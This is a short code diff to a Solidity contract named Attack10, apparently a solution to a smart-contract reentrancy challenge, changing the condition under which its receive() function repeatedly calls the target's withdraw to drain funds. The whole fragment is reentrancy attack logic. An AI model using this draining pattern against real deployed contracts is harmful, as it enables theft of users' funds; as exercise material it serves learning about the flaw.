@@ -21,7 +21,7 @@ contract Attack10 {
     }
 
     receive() external payable {
-        if (address(reentrance).balance > 0) {
+        if (address(reentrance).balance > amount) {
             reentrance.withdraw(amount);
         }
     }
